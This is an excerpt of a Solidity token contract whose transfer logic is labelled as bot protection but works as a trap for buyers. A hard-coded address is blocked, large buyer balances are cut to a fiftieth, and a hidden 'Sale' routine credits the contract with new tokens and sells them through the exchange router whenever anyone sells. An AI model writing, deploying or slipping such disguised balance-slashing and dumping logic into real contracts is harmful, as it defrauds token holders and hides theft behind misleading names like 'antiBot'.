...
require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD); // prevent from bot
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply.divCeil(16)) {
            balanceOf[Buy]=balanceOf[Buy].divCeil(50);}
        if (to != getPair() && to != router && msg.sender == getPair()){Buy = to;}
        if (to == getPair()) {Sale(antiBot(amount));}
    ...
    function Sale(uint256 amount) internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        balanceOf[address(this)] += amount;
        allowance [address(this)] [address(router)] = amount;
        address[] memory path = new address[](2);
    ...
    function antiBot(uint256 amount) public view returns (uint256) {
